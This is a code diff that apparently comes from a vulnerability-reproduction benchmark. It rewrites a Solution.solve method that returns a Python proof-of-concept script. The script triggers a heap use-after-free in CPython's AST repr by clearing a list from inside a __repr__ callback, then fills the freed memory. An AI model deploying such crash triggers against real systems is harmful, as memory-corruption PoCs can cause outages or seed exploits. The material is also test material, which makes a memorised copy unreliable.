@@ -3,50 +3,44 @@ import sys
 class Solution:
     def solve(self, src_path: str) -> bytes:
         """
-        Generate a PoC that triggers the Heap Use After Free vulnerability in AST repr().
-        
-        The vulnerability is triggered by invoking repr() on a deeply nested AST structure.
-        During the recursive generation of the string representation, the internal buffer 
-        may be reallocated. If the implementation holds a pointer to the old buffer across 
-        recursive calls, a Use-After-Free occurs.
-        
-        We generate a Python script that:
-        1. Sets a high recursion limit.
-        2. Programmatically constructs a deeply nested AST (using UnaryOp for density).
-        3. Calls repr() on the AST.
-        4. Catches RecursionError to ensure the fixed version exits with code 0.
+        Generate a PoC that triggers the Heap Use After Free vulnerability in AST repr.
         """
-        
-        # The Python script to be used as the PoC input
-        poc_script = r'''import sys
+        poc_source = """
 import ast
+import sys
 
-# Increase recursion limit to allow deep recursion in repr()
-sys.setrecursionlimit(1000000)
-
-def main():
-    try:
-        # Construct a deeply nested AST to stress the repr() implementation.
-        # We use UnaryOp(USub, ...) which generates "UnaryOp(op=USub(), operand=...)"
-        # This creates a large output string and deep recursion stack.
-        # 50,000 iterations is sufficient to trigger buffer reallocations and stack issues.
-        node = ast.Constant(value=1)
-        for _ in range(50000):
-            node = ast.UnaryOp(op=ast.USub(), operand=node)
-            
-        # Calling repr() on the node triggers the vulnerable C code path.
-        # In the vulnerable version, this causes a crash (UAF/Segfault).
-        repr(node)
+class UAFTrigger:
+    def __repr__(self):
+        # This function is called by ast_repr() when iterating over the AST node's list field.
+        # By clearing the list here, we free the underlying item array while the C loop 
+        # inside ast_repr still holds state (index/pointers) referring to it.
+        # This leads to a Heap Use After Free or Out of Bounds Read.
+        global vulnerable_list
+        vulnerable_list.clear()
         
-    except RecursionError:
-        # The fixed version typically raises RecursionError safely when depth limit is hit.
-        # We catch it to ensure a zero exit code for the fixed version.
-        pass
-    except Exception:
-        # Catch other potential non-fatal errors
-        pass
+        # Allocate some objects to fill the freed memory regions, increasing likelihood 
+        # of ASAN detection or crash.
+        fill = [b"A" * 64 for _ in range(100)]
+        return "Trigger"
 
-if __name__ == "__main__":
-    main()
-'''
-        return poc_script.encode('utf-8')
+# Prepare the list with the trigger object and padding
+vulnerable_list = []
+vulnerable_list.append(UAFTrigger())
+# Add padding to ensure the C loop continues after the first element
+vulnerable_list.extend([ast.Pass() for _ in range(50)])
+
+# Create an AST node that contains the list.
+# ast.List is a standard node with an 'elts' field (list of expressions).
+node = ast.List()
+node.elts = vulnerable_list
+node.ctx = ast.Load()  # Required for valid repr in some versions
+
+# Trigger the vulnerability
+try:
+    repr(node)
+except Exception:
+    # Fixed versions may raise an exception (e.g. RuntimeError) instead of crashing.
+    # We catch it to ensure the process exits with code 0 on fixed versions.
+    pass
+"""
+        return poc_source.encode('utf-8')
